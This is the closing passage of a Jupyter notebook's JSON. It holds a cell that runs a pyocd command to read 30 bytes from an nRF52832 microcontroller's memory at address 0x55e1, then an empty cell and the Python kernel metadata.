    "# Using pyocd - Read 30 bytes from 0x55e1\n",
    "!pyocd commander --target nrf52832 -c 'read8 0x55e1 30'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eac6080c-0521-405e-ab5d-e9105183015e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
